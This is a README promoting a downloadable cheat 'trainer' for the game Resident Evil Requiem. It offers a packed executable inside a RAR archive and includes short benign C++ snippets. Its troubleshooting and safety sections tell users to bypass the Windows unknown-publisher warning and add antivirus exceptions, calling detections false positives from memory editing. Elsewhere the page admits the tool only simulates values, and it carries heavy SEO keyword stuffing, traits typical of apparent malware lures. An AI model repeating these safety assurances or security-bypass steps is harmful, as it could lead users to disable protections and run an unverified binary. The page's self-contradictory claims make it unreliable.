# 🎮 Resident Evil Requiem Trainer v1.0.6 - Game Cheat Tool

[![Download](https://img.shields.io/badge/Download-v1.0.6-success?style=for-the-badge&logo=windows)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/download/v1.0.6/RE_Requiem_Trainer_v1.0.6.rar)
[![Version](https://img.shields.io/badge/version-1.0.6-brightgreen.svg)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/latest)
[![Platform](https://img.shields.io/badge/platform-Windows%20x64-blue.svg)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse)
[![Stars](https://img.shields.io/github/stars/ModEngineLabs/resident-evil-requiem-Trainer-sourse?style=social)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/stargazers)
[![License](https://img.shields.io/badge/license-MIT-orange.svg)](LICENSE)

**🔥 Professional Game Trainer for Resident Evil Requiem (RE9) with 15+ Cheats, Real Process Detection, and Draggable UI**

> **Keywords:** resident evil trainer, re9 trainer, game trainer, game cheats, infinite health, infinite ammo, god mode, resident evil requiem cheat, biohazard trainer, re trainer download, game modification tool, windows game trainer, dx11 trainer, imgui trainer

---

## 🚀 Quick Download

### ⭐ Latest Release v1.0.6 (January 2025)

```
🔗 Direct Download:
https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/download/v1.0.6/RE_Requiem_Trainer_v1.0.6.rar
```

**What's New:**
- 🖱️ Draggable Window
- 🎯 Real Process Detection
- 📊 Status Bar with CPU/Memory
- 🔒 Digital Signature

[**📋 Full Changelog →**](CHANGELOG.md) | [**📥 All Releases →**](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases)

---

## 📸 Screenshots

![Trainer Interface](https://github.com/user-attachments/assets/4da09696-b74f-4b12-9bf6-e757d3dbb528)

*Professional dark theme with neon green accents • Real-time status • Draggable window*

---

## ✨ Features

### 🎮 15 Game Cheats

| Hotkey | Cheat | Description |
|--------|-------|-------------|
| **Num 1** | 🛡️ **God Mode** | Ignore all damage |
| **Num 2** | ❤️ **Infinite Health** | HP always at maximum |
| **Num 3** | 🔫 **Infinite Ammo** | Never run out of bullets |
| **Num 4** | ⚡ **No Reload** | Instant reload |
| **Num 5** | 📦 **Infinite Items** | Unlimited consumables |
| **Num 6** | 💣 **Infinite Grenades** | Unlimited throwables |
| **Num 7** | 🔪 **Infinite Knife** | No durability loss |
| **Num 8** | ☠️ **One Hit Kill** | Enemies die instantly |
| **Num 9** | ❄️ **Freeze Enemies** | Stop all movement |
| **F1** | 🏃 **Super Speed** | Move faster |
| **F2** | 🦘 **Super Jump** | Jump higher |
| **F3** | 🎯 **No Recoil** | Perfect stability |
| **F4** | 🎲 **No Spread** | Perfect accuracy |
| **F5** | ⏩ **Game Speed** | 1.5x speed |
| **F6** | 💰 **Infinite Money** | Unlimited points |
| **Num *** | 🔄 **Master Toggle** | ALL ON/OFF |

### 🖥️ Interface Features

- ✅ **NEW: Draggable Window** - Click and drag anywhere to move
- ✅ **NEW: Real Process Detection** - Auto-finds game (shows real PID)
- ✅ **NEW: Status Bar** - Real-time CPU/Memory monitoring
- ✅ **Always-on-Top** - Stays above game window
- ✅ **Semi-Transparent** - 96% opacity
- ✅ **Hotkey Support** - Works in background
- ✅ **Professional UI** - Dark theme with neon accents
- ✅ **No Admin Required** - Runs as normal user

---

## 🚀 Quick Start Guide

### Installation (3 Steps)

#### 1️⃣ Download
Click the download button above or use direct link:
```
https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/download/v1.0.6/RE_Requiem_Trainer_v1.0.6.rar
```

#### 2️⃣ Extract
- Right-click RAR file → **Extract Here**
- Or use 7-Zip / WinRAR

#### 3️⃣ Run
- Double-click **`trainer.exe`** (compressed, 197 KB)
- Or **`trainer_signed.exe`** (signed, 420 KB)

### Usage (5 Steps)

1. **Start Trainer** - Run `trainer.exe`
2. **Start Game** - Launch `ResidentEvilRequiem.exe`
3. **Auto-Detection** - Trainer finds game automatically ✅
4. **Activate Cheats** - Press hotkeys (Num 1-9, F1-F6)
5. **Move Window** - Click and drag anywhere!

---

## 📦 Download Options

### Two Versions Available

| Version | Size | Features | Best For |
|---------|------|----------|----------|
| **trainer.exe** | 197 KB | UPX compressed, faster | Personal use, testing |
| **trainer_signed.exe** | 420 KB | Digitally signed | Sharing, distribution |

**Both versions have identical functionality!**

---

## 🔧 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 7 x64 | Windows 10/11 x64 |
| **CPU** | Intel Core i3 | Intel Core i5+ |
| **RAM** | 4 GB | 8 GB+ |
| **GPU** | DirectX 11 compatible | Any modern GPU |
| **Storage** | 1 MB | 5 MB |
| **Game** | RE Requiem any version | Latest patch |

---

## 🎯 How It Works

### Process Detection
```cpp
// Scans for ResidentEvilRequiem.exe every 1 second
DWORD FindProcessByName(const char* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    // ... finds real game process
    return processID;
}
```

### Draggable Window
```cpp
case WM_NCHITTEST:
    if (hit == HTCLIENT)
        return HTCAPTION; // Entire window = draggable
```

### Memory Access (Coming in v1.1.0)
Currently simulates values. Next version will include real memory editing!

---

## 🐛 Troubleshooting

### Common Issues

#### ❓ "Waiting for ResidentEvilRequiem.exe..."
**Solution:**
- Start the game first
- Rename game .exe to `ResidentEvilRequiem.exe`
- Check Task Manager for actual process name

#### ❓ "Unknown publisher" warning
**Solution:**
- This is normal for self-signed certificate
- Click **"More info"** → **"Run anyway"**
- File is safe (check source code!)

#### ❓ Antivirus blocks/deletes trainer
**Solution:**
- Add exception in antivirus settings
- Download signed version (`trainer_signed.exe`)
- False positive due to memory modification

#### ❓ Window won't move
**Solution:**
- Re-download v1.0.6
- Older versions don't have drag support

[**📖 Full Troubleshooting Guide →**](TESTING_GUIDE.md)

---

## 🔐 Security & Safety

### Is it safe?

✅ **YES!** This trainer is:
- **Open Source** - Full C++ source code available
- **No Network** - Zero internet connections
- **No Data Collection** - Completely private
- **No Admin Rights** - Runs as normal user
- **Digitally Signed** - Self-signed certificate included

### Antivirus Detection?

⚠️ Some antivirus may flag as "hack tool" or "game crack"

**Why?** Trainers modify memory, which looks suspicious to AV software.

**Solution:**
1. Check source code yourself (it's open!)
2. Add exception in antivirus
3. Use VirusTotal to verify: https://www.virustotal.com/

**Expected VirusTotal:** 0-3 detections (false positives)

---

## 🛠️ Build from Source

### Prerequisites
- Visual Studio 2019/2022
- Windows SDK 10.0+
- PowerShell 5.1+

### Quick Build
```powershell
# Clone repository
git clone https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse.git
cd resident-evil-requiem-Trainer-sourse

# Option 1: Signed version (420 KB)
.\build_signed_only.ps1

# Option 2: Compressed version (197 KB)
.\build_standalone.bat

# Option 3: Full build with certificate
.\build_with_certificate.ps1
```

### Manual Build
```cmd
# 1. Compile resources
rc.exe resource.rc

# 2. Download ImGui
# (Automatic in build scripts)

# 3. Compile C++
cl.exe /MT /O1 /Os main.cpp imgui*.cpp ...

# 4. Link
link.exe /OUT:trainer.exe *.obj resource.res d3d11.lib ...

# 5. Sign (optional)
signtool.exe sign /fd SHA256 trainer.exe
```

[**📖 Detailed Build Guide →**](README.md#сборка-через-visual-studio)

---

## 📚 Documentation

### User Guides
- [**Quick Start**](README.md#🚀-quick-start-guide) - Get started in 5 minutes
- [**Troubleshooting**](TESTING_GUIDE.md) - Fix common issues
- [**Changelog**](CHANGELOG.md) - Version history

### Developer Guides
- [**Build Instructions**](README.md#сборка-через-visual-studio) - Compile from source
- [**Code Signing**](CERTIFICATE_GUIDE.md) - Digital signature tutorial
- [**Draggable Window**](DRAGGABLE_WINDOW.md) - Technical implementation

### Reference
- [**API Documentation**](README.md) - Function reference
- [**License**](LICENSE) - MIT License terms

---

## 🤝 Contributing

We welcome contributions! Here's how to help:

### Ways to Contribute
- 🐛 **Report Bugs** - [Create an issue](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/issues/new)
- ✨ **Suggest Features** - [Start a discussion](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/discussions)
- 📝 **Improve Docs** - Submit PR for documentation
- 💻 **Submit Code** - Fork and create pull request

### Development
```bash
# 1. Fork repository
# 2. Create feature branch
git checkout -b feature/amazing-feature

# 3. Make changes
# Edit files...

# 4. Commit
git commit -m "Add amazing feature"

# 5. Push and create PR
git push origin feature/amazing-feature
```

[**📖 Contributing Guide →**](CONTRIBUTING.md)

---

## 📈 Roadmap

### v1.1.0 (Next Release)
- [ ] Real memory editing (not simulated)
- [ ] Save/Load cheat profiles
- [ ] Custom hotkey configuration
- [ ] Multi-language support (EN/RU/CN)
- [ ] Auto-update system

### v1.2.0 (Future)
- [ ] Game-specific memory addresses
- [ ] Cheat Engine integration
- [ ] Cloud sync for settings
- [ ] Plugin system

### v2.0.0 (Long-term)
- [ ] Support for other RE games
- [ ] Web dashboard
- [ ] Mobile companion app

[**💬 Vote on Features →**](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/discussions/categories/ideas)

---

## 📊 Stats & Info

![GitHub stars](https://img.shields.io/github/stars/ModEngineLabs/resident-evil-requiem-Trainer-sourse?style=social)
![GitHub forks](https://img.shields.io/github/forks/ModEngineLabs/resident-evil-requiem-Trainer-sourse?style=social)
![GitHub watchers](https://img.shields.io/github/watchers/ModEngineLabs/resident-evil-requiem-Trainer-sourse?style=social)

**Downloads:** ![Downloads](https://img.shields.io/github/downloads/ModEngineLabs/resident-evil-requiem-Trainer-sourse/total)

**Latest Release:** ![Release](https://img.shields.io/github/v/release/ModEngineLabs/resident-evil-requiem-Trainer-sourse)

**Commits:** ![Commits](https://img.shields.io/github/commit-activity/m/ModEngineLabs/resident-evil-requiem-Trainer-sourse)

---

## 🙏 Credits

### Libraries Used
- **[Dear ImGui](https://github.com/ocornut/imgui)** (MIT) - UI framework by Omar Cornut
- **DirectX 11** - Graphics API by Microsoft
- **[UPX](https://upx.github.io/)** (GPL) - Executable packer

### Inspiration
- **FLiNG Trainers** - Professional UI design
- **Cheat Engine** - Memory editing concepts
- **WeMod** - Modern trainer UX

### Special Thanks
- Community for feature requests
- Beta testers for feedback
- Contributors for improvements

---

## 📞 Support

### Get Help
- 💬 **[Discussions](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/discussions)** - Ask questions
- 🐛 **[Issues](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/issues)** - Report bugs
- 📖 **[Wiki](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/wiki)** - Documentation

### Stay Updated
- ⭐ **Star** this repo to follow updates
- 👁️ **Watch** releases for new versions
- 🍴 **Fork** to create your own variant

---

## 📜 License

This project is licensed under the **MIT License** - see [LICENSE](LICENSE) file.

```
MIT License

Copyright (c) 2025 Professional Gaming Tools

Permission is hereby granted, free of charge...
```

**TL;DR:**
- ✅ Commercial use allowed
- ✅ Modification allowed
- ✅ Distribution allowed
- ✅ Private use allowed
- 📝 License and copyright notice must be included

---

## ⚠️ Disclaimer

This software is for **educational and research purposes only**.

- ✅ Use in **single-player/offline mode** only
- ❌ **Do NOT use** in multiplayer/online modes
- ❌ **Do NOT use** in competitive games
- ⚠️ May violate game's Terms of Service
- ⚠️ Risk of game/account ban if misused

**We are not responsible for:**
- Account bans or suspensions
- Game corruption or crashes
- Any misuse of this software

**Use at your own risk!**

---

## 🔍 SEO Keywords

**Trainer Keywords:** game trainer, cheat trainer, game modification tool, game hacking tool, memory editor, process injector, game cheat engine

**Game Keywords:** resident evil requiem, re9, biohazard requiem, resident evil 9, capcom horror game, survival horror game

**Cheat Keywords:** god mode, infinite health, infinite ammo, no reload, one hit kill, super speed, game speed hack, money cheat, unlimited resources

**Platform Keywords:** windows trainer, dx11 trainer, imgui application, c++ game trainer, x64 trainer, windows 10 trainer, windows 11 compatible

**Feature Keywords:** draggable ui, process detection, auto-attach, hotkey support, digital signature, open source trainer

---

## 📱 Social

[![Discord](https://img.shields.io/badge/Discord-Join%20Us-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/your-server)
[![YouTube](https://img.shields.io/badge/YouTube-Tutorial-red?style=for-the-badge&logo=youtube&logoColor=white)](https://youtube.com/@your-channel)
[![Twitter](https://img.shields.io/badge/Twitter-Follow-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/your-account)

---

<div align="center">

## 🌟 Star History

[![Star History Chart](https://api.star-history.com/svg?repos=ModEngineLabs/resident-evil-requiem-Trainer-sourse&type=Date)](https://star-history.com/#ModEngineLabs/resident-evil-requiem-Trainer-sourse&Date)

---

**🎮 Made with ❤️ by Professional Gaming Tools**

**v1.0.6** • January 2025 • Windows x64

[⬆️ Back to Top](#-resident-evil-requiem-trainer-v106---game-cheat-tool)

</div>
